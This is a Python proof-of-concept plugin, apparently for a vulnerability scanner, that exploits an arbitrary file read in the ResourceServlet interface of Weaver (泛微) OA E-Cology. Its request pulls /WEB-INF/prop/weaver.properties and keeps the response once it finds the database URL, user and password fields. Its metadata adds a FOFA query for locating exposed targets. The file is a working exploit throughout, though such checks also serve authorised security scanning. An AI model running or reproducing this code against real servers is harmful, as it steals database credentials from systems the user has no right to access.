#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/D3DNGy8sStI_aE4qyae9jg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微OA E-Cology ResourceServlet接口任意文件读取',

      'level'     :   'critical',

      'FOFA'      :   'app="泛微-OA（e-cology）"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/6/18',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Connection': 'Keep-Alive',
      }
  target = '/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'ecology.url.*?ecology.user.*?ecology.charset.*?ecology.password',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret